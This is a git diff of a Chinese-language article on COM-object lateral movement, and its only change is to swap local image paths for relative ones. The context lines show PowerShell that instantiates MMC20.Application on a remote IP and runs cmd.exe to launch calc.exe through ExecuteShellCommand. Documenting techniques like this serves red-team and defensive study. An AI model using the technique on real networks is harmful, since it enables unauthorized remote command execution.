@@ -19,7 +19,7 @@ PS C:\Users\Administrator\Desktop> $handle = [activator]::CreateInstance([type]:
 PS C:\Users\Administrator\Desktop> $handle | Get-Member
 ```
 
-![](/Users/cate4cafe/工作/文章/com对象横向移动/media/1.png)
+![](./media/1.png)
 
 
 
@@ -31,7 +31,7 @@ MMC应用程序类（MMC20.Application），这个COM对象允许使用脚本来
 [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","192.168.145.11")).Document.ActiveView.ExecuteShellCommand("C:\\windows\\system32\\cmd.exe", $null,"/c calc.exe","7")
 ```
 
-![](/Users/cate4cafe/工作/文章/com对象横向移动/media/2.png)
+![](./media/2.png)
 
 
 
